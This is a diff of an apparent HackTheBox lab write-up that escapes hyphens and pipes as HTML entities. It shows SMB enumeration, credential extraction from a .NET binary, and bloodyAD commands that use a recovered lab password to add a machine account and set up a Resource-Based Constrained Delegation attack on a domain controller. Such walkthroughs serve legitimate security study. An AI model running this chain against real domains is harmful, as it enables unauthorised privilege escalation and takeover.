@@ -45,7 +45,7 @@ This box is rated Easy but the first part (extracting and decrypting the passwor
 
 Initial port scan focused on SMB and then share enumeration:
 
-nmap -Pn -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users 10.129.20.89
+nmap -Pn -p445 &#45;&#45;script smb-os-discovery,smb-enum-shares,smb-enum-users 10.129.20.89
 
 Host reachable. A non-standard share appears: support-tools, accessible anonymously. AD environment confirmed. Domain: support.htb, DC: dc.support.htb.
 
@@ -70,11 +70,11 @@ Relevant files: UserInfo.exe.zip, putty.exe, WiresharkPortable, etc. The only in
 
 Unzipped and analysed. It's a .NET executable. First pass with strings to get oriented:
 
-strings UserInfo.exe | grep -iE "password|ldap|key"
+strings UserInfo.exe &#124; grep -iE "password&#124;ldap&#124;key"
 
 References to enc_password, LdapQuery, getPassword. The binary queries LDAP using hardcoded, encrypted credentials. I disassemble with monodis to read the fields:
 
-monodis --output=userinfo.il UserInfo.exe
+monodis &#45;&#45;output=userinfo.il UserInfo.exe
 
 The two key values extracted:
 
@@ -167,17 +167,17 @@ Checked the permissions on the GPOs: write only for Domain Admins, Enterprise Ad
 
 The correct vector emerges by enumerating support's write rights over the AD objects with bloodyAD:
 
-bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' get writable
+bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' get writable
 
 Revealing output: support has DACL: WRITE on the object CN=DC,OU=Domain Controllers (the DC's computer account). This, combined with the SeMachineAccountPrivilege seen earlier, allows a complete Resource-Based Constrained Delegation attack.
 
 Step 1 — I create a computer account under my control:
 
-bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer fakepc 'Pass123!'
+bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer fakepc 'Pass123!'
 
 Step 2 — I configure RBCD on DC$ delegating to my fakepc (note: the sAMAccountName requires the trailing $, the first attempt without the $ failed with NoResultError):
 
-bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd 'DC$' 'fakepc$'
+bloodyAD &#45;&#45;host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd 'DC$' 'fakepc$'
 
 Output: fakepc$ can now impersonate users on DC$ via S4U2Proxy.
 
